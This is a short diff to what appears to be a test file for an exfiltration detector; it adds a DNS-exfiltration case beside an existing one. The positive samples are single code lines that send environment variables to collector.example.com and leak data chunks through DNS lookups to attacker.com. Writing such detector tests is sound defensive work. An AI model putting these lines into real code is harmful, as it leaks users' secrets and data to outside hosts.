@@ -32,6 +32,10 @@ CASES = {
         "positive": "requests.post('https://collector.example.com', data=os.environ)",
         "negative": "requests.get('https://example.com/status')",
     },
+    "dns_exfil_pattern": {
+        "positive": "socket.gethostbyname(f'{chunk}.attacker.com')",
+        "negative": "host_ip = '192.168.1.1'",
+    },
 }
 
 
